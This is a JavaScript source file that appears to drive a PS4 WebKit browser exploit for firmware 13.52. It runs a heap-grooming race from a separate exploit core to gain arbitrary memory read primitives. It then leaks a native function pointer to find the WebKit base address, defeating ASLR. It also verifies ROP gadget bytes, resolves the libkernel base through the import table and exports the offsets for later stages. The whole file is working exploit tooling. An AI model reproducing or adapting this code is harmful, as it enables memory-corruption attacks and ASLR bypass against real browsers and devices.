import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";

const params = new URLSearchParams(location.search);
const lines = [];
let busy = false;
let ready = false;
let exploit = null;
let nativeFn = null;
let tableOff = null;
let calibrated = null;
let raceAttempt = 0;
let lengthMissStreak = 0;

const LOG_MAX = 300;
const CAL_ALIGN_STEP = 0x4000;
const ELF_MAGIC = 0x464c457f;
const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|CAL-|GADGET|ELF|BASES|LK-|PASTE|HINT-GROOM/i;

const GADGET_CHECKS = [
    ["POP_RDI", "wk_POP_RDI_RET", [0x5f, 0xc3]],
    ["POP_RSI", "wk_POP_RSI_RET", [0x5e, 0xc3]],
    ["POP_RDX", "wk_POP_RDX_RET", [0x5a, 0xc3]],
    ["POP_RCX", "wk_POP_RCX_RET", [0x59, 0xc3]],
    ["POP_RAX", "wk_POP_RAX_RET", [0x58, 0xc3]],
    ["POP_R8", "wk_POP_R8_RET", [null, 0x58, 0xc3]],
    ["POP_R9", "wk_POP_R9_RET", [null, 0x59, 0xc3]],
    ["LEAVE", "wk_LEAVE_RET", [0xc9, 0xc3]],
];

const GROOM_PRESETS = {
    default: { g: [] },
    lite: { g: ["drain:256", "drainsz:32768", "slab:2097152"] },
    "384": { g: ["drain:384", "drainsz:32768", "slab:2097152"] },
    "512": { g: ["drain:512", "drainsz:32768", "slab:2097152"] },
    max: {
        g: [
            "drain:512", "drainsz:65536", "slab:4194304",
            "bfly:528384", "early:458752", "guard:589824",
            "pred:524288", "final:524288",
        ],
    },
};

function currentGroomKey() {
    const gs = params.getAll("g");
    if (gs.length === 0) return "default";
    for (const key of Object.keys(GROOM_PRESETS)) {
        if (key === "default") continue;
        const preset = GROOM_PRESETS[key];
        if (preset.g.length !== gs.length) continue;
        let match = true;
        for (let i = 0; i < preset.g.length; i++) {
            if (gs[i] !== preset.g[i]) { match = false; break; }
        }
        if (match) return key;
    }
    return "custom";
}

function groomBootLine() {
    const key = currentGroomKey();
    const gs = params.getAll("g");
    if (key === "custom") return "groom=custom (" + gs.join(", ") + ")";
    if (key === "default") return "groom=default (core 384 drain)";
    return "groom=" + key;
}

function reloadWithGroomPreset(key) {
    const preset = GROOM_PRESETS[key];
    if (!preset) return;
    const url = new URL(location.href);
    url.searchParams.delete("g");
    url.searchParams.delete("slots");
    for (let i = 0; i < preset.g.length; i++)
        url.searchParams.append("g", preset.g[i]);
    location.href = url.toString();
}

function wireGroomBar() {
    const key = currentGroomKey();
    const nodes = document.querySelectorAll("[data-groom]");
    for (let i = 0; i < nodes.length; i++) {
        const el = nodes[i];
        el.classList.toggle("active", el.getAttribute("data-groom") === key);
        el.addEventListener("click", function () {
            if (busy) return;
            const k = el.getAttribute("data-groom");
            if (k) reloadWithGroomPreset(k);
        });
    }
}

let outEl, stateEl, resultEl, nativeFnEl, baseEl, expm1In;
let btnStart, btnLite, btnWide, btnVerify, btnCopy, btnClear;
let scanMode = "lite";
let scanIndex = 0;
let scanList = [];

function $(id) { return document.getElementById(id); }

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    lines.push(line);
    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
    if (outEl) {
        outEl.textContent = lines.join("\n");
        outEl.scrollTop = outEl.scrollHeight;
    }
}

function state(msg, cls) {
    if (!stateEl) return;
    stateEl.textContent = msg;
    stateEl.className = cls || "";
}

function setUi() {
    const calReady = ready && nativeFn;
    if (btnStart) btnStart.disabled = busy || ready;
    if (btnLite) btnLite.disabled = busy || !calReady;
    if (btnWide) btnWide.disabled = busy || !calReady;
    if (btnVerify) btnVerify.disabled = busy || !calReady;
    if (btnCopy) btnCopy.disabled = busy || !calibrated;
    if (expm1In) expm1In.disabled = busy || !calReady;
}

function parseAddr(str) {
    if (!str) return null;
    const s = String(str).trim().toLowerCase().replace(/^0x/, "");
    if (!/^[0-9a-f]+$/.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16), 0);
    return new int64(parseInt(s.slice(-8), 16), parseInt(s.slice(0, -8), 16));
}

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function read1p(p, addr) {
    if (!addr) return null;
    try { return p.read1(addr); } catch (_) { return null; }
}

function alignedWebkitBase(v) {
    return v && v.hi > 0 && (v.low & 0x3fff) === 0;
}

function liteHintDeltas(off, fn) {
    const hint = off.wk_expm1_builtin;
    if (hint == null) return [];
    const k = liteSpanK();
    const residue = fn.low & (CAL_ALIGN_STEP - 1);
    const out = [];
    for (let i = -k; i <= k; i++) {
        const d = (hint + i * CAL_ALIGN_STEP) >>> 0;
        if ((d & 0x3fff) === residue) out.push(d);
    }
    return out;
}

function wideAlignedDeltas(fn) {
    const minD = parseInt(params.get("min") || "0x2570000", 16);
    const maxD = parseInt(params.get("max") || "0x25a0000", 16);
    const residue = fn.low & (CAL_ALIGN_STEP - 1);
    const out = [];
    let d = (minD & ~(CAL_ALIGN_STEP - 1)) | residue;
    if (d < minD) d += CAL_ALIGN_STEP;
    while (d <= maxD) {
        out.push(d >>> 0);
        d += CAL_ALIGN_STEP;
    }
    return out;
}

function liteSpanK() {
    const fromUrl = parseInt(params.get("litek") || "", 10);
    if (fromUrl > 0) return fromUrl;
    return 8;
}

function captureNativeFn(p, off) {
    const mOff = off.wk_JSFunction_m_function || 0x28;
    const cell = p.leakval(Math.expm1);
    const mid = read8p(p, cell.add32(0x18));
    if (!mid) return null;
    const fn = read8p(p, mid.add32(mOff));
    if (!fn) return null;
    try { sessionStorage.setItem("wk-nativeFn", String(fn)); } catch (_) { }
    return fn;
}

function loadNativeFnOverride() {
    const raw = params.get("nativefn") || sessionStorage.getItem("wk-nativeFn");
    return parseAddr(raw);
}

function updateResultPanel() {
    if (nativeFnEl) nativeFnEl.textContent = nativeFn ? String(nativeFn) : "—";
    if (baseEl) {
        if (calibrated && calibrated.webkitBase)
            baseEl.textContent = String(calibrated.webkitBase);
        else if (nativeFn && expm1In && expm1In.value.trim())
            baseEl.textContent = String(nativeFn.sub32(parseExpm1(expm1In.value)));
        else
            baseEl.textContent = "—";
    }
    if (resultEl) {
        if (!calibrated) {
            resultEl.textContent = "no verified expm1 yet";
            return;
        }
        resultEl.textContent = [
            "expm1=0x" + calibrated.delta.toString(16),
            "webkit=" + calibrated.webkitBase,
            calibrated.libkernelBase ? "libkernel=" + calibrated.libkernelBase : "libkernel=(IAT not verified)",
            "gadgets=" + calibrated.gadgetOk + "/" + calibrated.gadgetTotal,
            calibrated.elf ? "ELF=ok" : "ELF=bad",
        ].join("\n");
    }
}

function parseExpm1(str) {
    const s = String(str || "").trim().replace(/^0x/i, "");
    const n = parseInt(s, 16);
    return n > 0 ? n : 0;
}

function checkGadgetBytes(p, base, rva, pat) {
    if (rva == null) return false;
    const a = base.add32(rva);
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        const b = read1p(p, a.add32(i));
        if (b == null || b !== pat[i]) return false;
    }
    return true;
}

function verifyDelta(p, fn, delta, off, readsBudget) {
    const out = {
        delta,
        webkitBase: null,
        libkernelBase: null,
        elf: false,
        gadgetOk: 0,
        gadgetTotal: GADGET_CHECKS.length,
        gadgetMiss: [],
        reads: 0,
        ok: false,
    };
    if (!(delta > 0)) return out;

    const base = fn.sub32(delta);
    out.webkitBase = base;
    if (!alignedWebkitBase(base)) {
        out.reason = "base not 0x4000-aligned";
        return out;
    }

    if (readsBudget != null && out.reads >= readsBudget) return out;
    const magic = read4p(p, base);
    out.reads++;
    out.elf = magic === ELF_MAGIC;
    if (!out.elf) {
        out.reason = "no ELF magic @ base (got 0x"
            + (magic == null ? "null" : (magic >>> 0).toString(16)) + ")";
        return out;
    }
    mark("ELF-OK", "base=" + base + " delta=0x" + delta.toString(16));

    for (const [name, key, pat] of GADGET_CHECKS) {
        if (readsBudget != null && out.reads + pat.filter(x => x !== null).length > readsBudget + 20)
            break;
        const rva = off[key];
        if (rva == null) {
            out.gadgetMiss.push(name + "(no rva)");
            continue;
        }
        for (let i = 0; i < pat.length; i++) {
            if (pat[i] !== null) out.reads++;
        }
        if (checkGadgetBytes(p, base, rva, pat)) {
            out.gadgetOk++;
            mark("GADGET-OK", name + " @+" + rva.toString(16));
        } else {
            out.gadgetMiss.push(name);
            mark("GADGET-BAD", name + " @+" + (rva == null ? "?" : rva.toString(16)));
        }
    }

    if (off.wk___imp___error && off.k__error) {
        const errorFn = read8p(p, base.add32(off.wk___imp___error));
        out.reads++;
        if (errorFn) {
            const lk = errorFn.sub32(off.k__error);
            const w0 = read4p(p, lk);
            const w1 = read4p(p, lk.add32(4));
            out.reads += 2;
            if (w0 != null && w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f) {
                out.libkernelBase = lk;
                mark("LK-OK", String(lk));
            } else {
                mark("LK-BAD", "prologue w0=0x" + (w0 == null ? "?" : (w0 >>> 0).toString(16))
                    + " w1=0x" + (w1 == null ? "?" : (w1 >>> 0).toString(16)));
                out.lkHint = "wk___imp___error / k__error may differ on 13.52";
            }
        } else {
            mark("LK-BAD", "IAT __error unreadable @ webkit+" + off.wk___imp___error.toString(16));
        }
    }

    out.ok = out.elf && out.gadgetOk >= 6;
    return out;
}

function applyCalibration(result) {
    calibrated = result;
    const live = {
        fw_status: "calibrated on hardware (index_cal.html)",
        wk_JSFunction_m_function: tableOff.wk_JSFunction_m_function || 0x28,
        wk_expm1_builtin: result.delta,
        wk_ArrayBuffer_m_impl: tableOff.wk_ArrayBuffer_m_impl,
        wk_ArrayBuffer_m_contents_m_data: tableOff.wk_ArrayBuffer_m_contents_m_data,
    };
    if (tableOff.wk___imp___error) live.wk___imp___error = tableOff.wk___imp___error;
    if (tableOff.k__error) live.k__error = tableOff.k__error;
    for (const [, key] of GADGET_CHECKS) {
        if (tableOff[key] != null) live[key] = tableOff[key];
    }

    try {
        sessionStorage.setItem("wk-calibrated", JSON.stringify(live));
        sessionStorage.setItem("wk-webkitBase", String(result.webkitBase));
        sessionStorage.removeItem("wk-cal-lite-i");
        sessionStorage.removeItem("wk-cal-wide-i");
    } catch (_) { }

    mark("CAL-OK", "expm1=0x" + result.delta.toString(16) + " base=" + result.webkitBase);
    mark("BASES", "webkit=" + result.webkitBase
        + (result.libkernelBase ? " libkernel=" + result.libkernelBase : ""));
    mark("PASTE-OFFSETS", JSON.stringify(live, null, 2));
    if (expm1In) expm1In.value = result.delta.toString(16);
    updateResultPanel();
    state("CAL-OK — expm1 verified", "ok");
    setUi();
}

function rebuildScanList(mode) {
    scanMode = mode;
    if (mode === "lite") scanList = liteHintDeltas(tableOff, nativeFn);
    else scanList = wideAlignedDeltas(nativeFn);
    const key = mode === "lite" ? "wk-cal-lite-i" : "wk-cal-wide-i";
    try { scanIndex = parseInt(sessionStorage.getItem(key) || "0", 10) || 0; }
    catch (_) { scanIndex = 0; }
    mark("SCAN-LIST", mode + " candidates=" + scanList.length + " next=" + (scanIndex + 1));
    if (scanList.length > 0 && scanIndex < 5) {
        mark("SCAN-PEEK", scanList.slice(scanIndex, scanIndex + 5)
            .map(d => "0x" + d.toString(16)).join(" "));
    }
}

function logNativeFnInfo(fn) {
    const residue = fn.low & (CAL_ALIGN_STEP - 1);
    mark("CAL-NATIVEFN", String(fn));
    mark("CAL-RESIDUE", "low&0x3fff=0x" + residue.toString(16)
        + " (delta must match this nibble)");
    mark("CAL-FORMULA", "webkitBase = nativeFn - expm1");
    if (tableOff && tableOff.wk_expm1_builtin != null) {
        const hint = tableOff.wk_expm1_builtin;
        const hintBase = fn.sub32(hint);
        mark("CAL-HINT", "table expm1=0x" + hint.toString(16)
            + " → base=" + hintBase + (alignedWebkitBase(hintBase) ? "" : " (misaligned)"));
    }
}

async function loadExploit() {
    if (exploit) return exploit;
    mark("LOAD", "core.js + mem.js");
    const core = await import("./core.js");
    exploit = { establishPrimitive: core.establishPrimitive, installWindowP };
    return exploit;
}

function attemptCap() {
    if (!params.has("attempts")) return 0;
    const n = parseInt(params.get("attempts"), 10);
    return n > 0 ? n : 0;
}

function onRaceEvent(tag, detail) {
    if (!CORE_LOG.test(tag)) return;
    mark(tag, detail || "");

    if (tag === "ATTEMPT-START") {
        raceAttempt++;
        state("race attempt " + raceAttempt + "…", "warn");
        if (raceAttempt === 15 || raceAttempt === 30 || raceAttempt === 50)
            mark("HINT-GROOM", "still missing? close browser fully → reload → tap 512 or max groom");
    }

    if (/COMPOSITION-LENGTH-MISS|SSV-PLACEMENT-MISS|ZERO-HEADER-MISS/.test(tag)) {
        lengthMissStreak++;
        if (lengthMissStreak === 8 || lengthMissStreak === 20)
            mark("HINT-GROOM", "COMPOSITION-LENGTH-MISS = race lost — tap 512 drain or max groom above, close browser, reload");
    }

    if (tag === "READ-PRIMITIVE-PASS" || tag === "PRIMITIVE-OK")
        lengthMissStreak = 0;
}

async function establishOnce(establishPrimitive) {
    raceAttempt = 0;
    lengthMissStreak = 0;
    const cap = attemptCap();
    mark("ATTEMPTS", cap > 0 ? String(cap) + " per page load" : "unlimited (single run)");
    mark("NOTE", "close browser fully before Start if prior OOM or long retry session");

    return establishPrimitive({
        maxAttempts: cap,
        onEvent: (t, d, a) => onRaceEvent(t, (a != null ? "[" + a + "] " : "") + (d || ""))
    });
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    setUi();
    lines.length = 0;
    calibrated = null;

    const detected = offsetsFor(navigator.userAgent);
    tableOff = (offsetsForKey(detected.key || "13.52").off) || offsetsForKey("13.52").off;
    mark("UA-FW", detected.key || "unknown");
    mark("GOAL", "find wk_expm1_builtin for 13.52 retail");
    state("getting primitive…", "warn");

    try {
        const { establishPrimitive, installWindowP: installP } = await loadExploit();
        let carrier;
        try {
            carrier = await establishOnce(establishPrimitive);
        } catch (err) {
            if (/gave up/i.test(String(err.message))) {
                mark("HINT-GROOM", "race lost — close browser fully, reload, tap 512 or max groom, Start again");
            }
            throw err;
        }
        installP(carrier, { promote: params.get("promote") === "1" });
        const p = window.p;
        if (!p) throw new Error("window.p missing");

        mark("PRIMITIVE-OK", "");
        mark("PAIR-STATUS", "state=" + pairStatus.state);

        nativeFn = captureNativeFn(p, tableOff) || loadNativeFnOverride();
        if (!nativeFn) throw new Error("nativeFn capture failed");

        ready = true;
        logNativeFnInfo(nativeFn);
        rebuildScanList("lite");

        const pre = parseExpm1(params.get("expm1"));
        if (pre > 0 && expm1In) expm1In.value = pre.toString(16);

        updateResultPanel();
        state("primitive OK — lite scan or type expm1 + verify", "ok");
    } catch (err) {
        state("failed: " + err.message, "bad");
        mark("ERROR", err.stack || err.message);
    } finally {
        busy = false;
        setUi();
    }
}

async function runScanStep(mode) {
    if (busy || !ready || !window.p || !nativeFn) return;
    busy = true;
    setUi();

    if (scanMode !== mode || scanList.length === 0) rebuildScanList(mode);
    const key = mode === "lite" ? "wk-cal-lite-i" : "wk-cal-wide-i";

    try {
        if (scanIndex >= scanList.length) {
            mark("CAL-FAIL", mode + " scan exhausted (" + scanList.length + " tries)");
            mark("HINT", "type expm1 manually + verify, or ?min= / ?max= for wide range");
            state("scan miss — try manual verify", "warn");
            return;
        }

        const delta = scanList[scanIndex];
        mark("CAL-TRY", (scanIndex + 1) + "/" + scanList.length
            + " 0x" + delta.toString(16));

        await new Promise(r => setTimeout(r, 48));

        const p = window.p;
        const quick = read4p(p, nativeFn.sub32(delta));
        if (quick !== ELF_MAGIC) {
            mark("ELF-MISS", "0x" + delta.toString(16));
            scanIndex++;
            try { sessionStorage.setItem(key, String(scanIndex)); } catch (_) { }
            state(mode + " " + scanIndex + "/" + scanList.length + " — tap again", "warn");
            return;
        }

        const full = verifyDelta(p, nativeFn, delta, tableOff);
        scanIndex++;
        try { sessionStorage.setItem(key, String(scanIndex)); } catch (_) { }

        if (full.ok) {
            try { sessionStorage.removeItem(key); } catch (_) { }
            applyCalibration(full);
        } else {
            mark("CAL-NEAR", "ELF hit but gadgets=" + full.gadgetOk + "/" + full.gadgetTotal
                + (full.reason ? " " + full.reason : ""));
            state("ELF only — try next or manual", "warn");
        }
    } finally {
        busy = false;
        setUi();
    }
}

async function runVerifyManual() {
    if (busy || !ready || !window.p || !nativeFn) return;
    const delta = parseExpm1(expm1In && expm1In.value);
    if (!(delta > 0)) {
        mark("CAL-FAIL", "bad expm1 hex");
        state("invalid expm1", "bad");
        return;
    }

    busy = true;
    setUi();
    mark("CAL-VERIFY", "0x" + delta.toString(16) + " (full gadget + IAT check)");
    state("verifying…", "warn");

    try {
        await new Promise(r => setTimeout(r, 32));
        const full = verifyDelta(window.p, nativeFn, delta, tableOff);
        updateResultPanel();
        if (full.ok) applyCalibration(full);
        else {
            mark("CAL-FAIL", full.reason || ("gadgets " + full.gadgetOk + "/" + full.gadgetTotal));
            state("verify failed — try adjacent 0x4000 step", "warn");
        }
    } finally {
        busy = false;
        setUi();
    }
}

function runCopy() {
    const block = lines.find(l => l.startsWith("PASTE-OFFSETS"));
    if (!block) return;
    const json = block.replace(/^PASTE-OFFSETS\s+/, "");
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(json).then(
            () => mark("COPY", "offsets JSON copied"),
            () => mark("COPY", "clipboard failed — copy from log")
        );
    } else {
        mark("COPY", "copy PASTE-OFFSETS line from log");
    }
}

function reportErr(err) {
    const msg = err && err.message ? err.message : String(err);
    state("error: " + msg, "bad");
    mark("ERROR", err && err.stack ? err.stack : msg);
}

function wireClick(el, fn) {
    if (!el) return;
    el.addEventListener("click", function () {
        try {
            const r = fn();
            if (r && typeof r.then === "function")
                r.catch(reportErr);
        } catch (err) {
            reportErr(err);
        }
    });
}

function init() {
    outEl = $("out");
    stateEl = $("state");
    resultEl = $("result");
    nativeFnEl = $("native-fn");
    baseEl = $("webkit-base");
    expm1In = $("expm1-in");
    btnStart = $("btn-start");
    btnLite = $("btn-lite");
    btnWide = $("btn-wide");
    btnVerify = $("btn-verify");
    btnCopy = $("btn-copy");
    btnClear = $("btn-clear");

    if (!outEl || !btnStart) {
        state("UI missing — open via HTTP(S), not file://", "bad");
        return;
    }

    wireClick(btnStart, function () { return runStart(); });
    wireClick(btnLite, function () { return runScanStep("lite"); });
    wireClick(btnWide, function () { return runScanStep("wide"); });
    wireClick(btnVerify, function () { return runVerifyManual(); });
    wireClick(btnCopy, runCopy);
    wireClick(btnClear, function () {
        lines.length = 0;
        if (outEl) outEl.textContent = "";
    });

    if (expm1In)
        expm1In.addEventListener("input", function () { updateResultPanel(); });

    const cached = loadNativeFnOverride();
    if (cached) mark("BOOT", "cached nativeFn " + cached + " (re-run Start for live)");

    const pre = params.get("expm1");
    if (pre && expm1In) expm1In.value = pre.replace(/^0x/i, "");

    mark("BOOT", "index_cal.html — expm1 finder for 13.52");
    mark("BOOT", groomBootLine());
    mark("BOOT", "lite ±" + liteSpanK() + "×0x4000 around table hint; wide uses ?min=&max=");
    wireGroomBar();
    setUi();
    state("ready — pick groom if needed, then Start", "");
}

function bootUi() {
    try {
        init();
    } catch (err) {
        reportErr(err);
    }
}

if (document.readyState === "loading")
    document.addEventListener("DOMContentLoaded", bootUi);
else
    bootUi();
